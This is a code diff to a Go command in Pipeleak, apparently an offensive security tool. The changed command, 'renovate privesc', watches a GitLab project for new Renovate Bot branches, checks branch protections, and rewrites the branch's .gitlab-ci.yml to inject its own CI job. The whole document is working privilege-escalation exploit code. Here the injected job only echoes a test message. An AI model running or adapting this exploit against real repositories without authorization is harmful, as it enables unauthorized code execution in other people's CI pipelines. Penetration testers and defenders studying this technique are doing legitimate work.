@@ -2,7 +2,7 @@ package renovate
 
 import (
 	"regexp"
-	"time"
+	//"time"
 
 	"github.com/CompassSecurity/pipeleak/cmd/gitlab/util"
 	"github.com/CompassSecurity/pipeleak/helper"
@@ -26,7 +26,7 @@ func NewPrivescCmd() *cobra.Command {
 	privescCmd.Flags().StringVarP(&renovateBranchesRegex, "renovateBranchesRegex", "b", "renovate/.*", "The branch name regex expression to match the Renovate Bot branch names (default: 'renovate/.*')")
 	privescCmd.Flags().StringVarP(&repoName, "repoName", "r", "", "The repository to target")
 
-	err := privescCmd.MarkPersistentFlagRequired("repoName")
+	err := privescCmd.MarkFlagRequired("repoName")
 	if err != nil {
 		log.Fatal().Stack().Err(err).Msg("Unable to require repoName flag")
 	}
@@ -48,7 +48,6 @@ func Exploit(cmd *cobra.Command, args []string) {
 		log.Fatal().Stack().Err(err).Str("repoName", repoName).Msg("Unable to retrieve project information")
 	}
 
-	// check regex is valid
 	regex, err := regexp.Compile(renovateBranchesRegex)
 	if err != nil {
 		log.Fatal().Stack().Err(err).Msg("The provided renovateBranchesRegex regex is invalid")
@@ -73,7 +72,7 @@ func Exploit(cmd *cobra.Command, args []string) {
 	cicd := getBranchCiCdYml(git, project, *branch)
 
 	log.Info().Str("branch", branch.Name).Msg("Modifying CI/CD configuration")
-	cicd.Jobs["pipeleak-renovate-privesc"] = ci.JobConfig{
+	cicd["pipeleak-renovate-privesc"] = ci.JobConfig{
 		Stage:        "test",
 		Image:        "alpine:latest",
 		Script:       []string{"echo 'This is a test job for Pipeleak Renovate Privilege Escalation exploit'"},
@@ -102,16 +101,16 @@ func checkDefaultBranchProtections(git *gogitlab.Client, project *gogitlab.Proje
 	}
 
 	for _, accessLevel := range protectedbranch.PushAccessLevels {
-		log.Debug().Str("branch", project.DefaultBranch).Any("currentAccessLevel", currentAccessLevel).Msg("Testing push access level for default branch")
+		log.Debug().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("Testing push access level for default branch")
 		if currentAccessLevel >= accessLevel.AccessLevel {
-			log.Fatal().Str("branch", project.DefaultBranch).Any("currentAccessLevel", currentAccessLevel).Msg("You can already push to the default branch, no need to exploit")
+			log.Fatal().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("You can already push to the default branch, no need to exploit")
 		}
 	}
 
 	for _, accessLevel := range protectedbranch.MergeAccessLevels {
-		log.Debug().Str("branch", project.DefaultBranch).Any("currentAccessLevel", currentAccessLevel).Msg("Testing merge access level for default branch")
+		log.Debug().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("Testing merge access level for default branch")
 		if currentAccessLevel >= accessLevel.AccessLevel {
-			log.Fatal().Str("branch", project.DefaultBranch).Any("currentAccessLevel", currentAccessLevel).Msg("You can already merge to the default branch, no need to exploit")
+			log.Fatal().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("You can already merge to the default branch, no need to exploit")
 		}
 	}
 
@@ -119,31 +118,49 @@ func checkDefaultBranchProtections(git *gogitlab.Client, project *gogitlab.Proje
 }
 
 func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, regex *regexp.Regexp) *gogitlab.Branch {
+
+	originalBranches := make(map[string]bool)
+
 	for {
 		log.Debug().Msg("Checking for new branches created by Renovate Bot")
 		branches, _, err := git.Branches.ListBranches(project.ID, &gogitlab.ListBranchesOptions{
 			ListOptions: gogitlab.ListOptions{
-				Sort:    "created_at",
 				PerPage: 100,
 			}})
 
 		if err != nil {
-			log.Error().Err(err).Msg("Failed to list branches, retrying in 5 seconds")
+			log.Error().Err(err).Msg("Failed to list branches, retrying ...")
 		}
 
 		for _, branch := range branches {
-			log.Debug().Str("branch", branch.Name).Msg("Checking branch for Renovate Bot exploitation")
+
+			if len(originalBranches) == 0 {
+				log.Debug().Msg("Storing original branches for comparison")
+				for _, b := range branches {
+					originalBranches[b.Name] = true
+				}
+
+				if len(originalBranches) == 100 {
+					log.Warn().Msg("More than 100 branches found, new branches might not be detected, improve this logic here in a PR thx ;)")
+				}
+			}
+
+			if _, exists := originalBranches[branch.Name]; exists {
+				continue
+			}
+
+			log.Info().Str("branch", branch.Name).Msg("Checking if new branch matches Renovate Bot regex")
 			if regex.MatchString(branch.Name) {
 				log.Info().Str("branch", branch.Name).Msg("Identified Renovate Bot branch, starting exploit process")
 				return branch
 			}
 		}
 
-		time.Sleep(5 * time.Second)
+		//time.Sleep(5 * time.Second)
 	}
 }
 
-func getBranchCiCdYml(git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) ci.CI {
+func getBranchCiCdYml(git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) map[string]interface{} {
 	log.Info().Str("branch", branch.Name).Msg("Fetching .gitlab-ci.yml file from Renovate branch")
 	rawYml, _, err := git.RepositoryFiles.GetRawFile(project.ID, ".gitlab-ci.yml", &gogitlab.GetRawFileOptions{
 		Ref: gogitlab.Ptr(branch.Name),
@@ -153,7 +170,8 @@ func getBranchCiCdYml(git *gogitlab.Client, project *gogitlab.Project, branch go
 		log.Fatal().Stack().Err(err).Str("branch", branch.Name).Msg("Failed to retrieve .gitlab-ci.yml file from Renovate branch")
 	}
 
-	var ciCdConfig ci.CI
+	log.Debug().Str(".gitlab-ci.yml", string(rawYml)).Msg("Unmarshalling CI/CD configuration of the Renovate branch")
+	var ciCdConfig map[string]interface{}
 	err = yaml.Unmarshal(rawYml, &ciCdConfig)
 	if err != nil {
 		log.Fatal().Stack().Str(".gitlab-ci.yml", string(rawYml)).Err(err).Msg("Failed to unmarshal CI/CD configuration of the Renovate branch")
@@ -162,7 +180,7 @@ func getBranchCiCdYml(git *gogitlab.Client, project *gogitlab.Project, branch go
 	return ciCdConfig
 }
 
-func updateCiCdYml(yml ci.CI, git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) {
+func updateCiCdYml(yml map[string]interface{}, git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) {
 	log.Info().Str("branch", branch.Name).Msg("Updating .gitlab-ci.yml file in Renovate branch")
 	cicdYaml, err := yaml.Marshal(yml)
 	if err != nil {
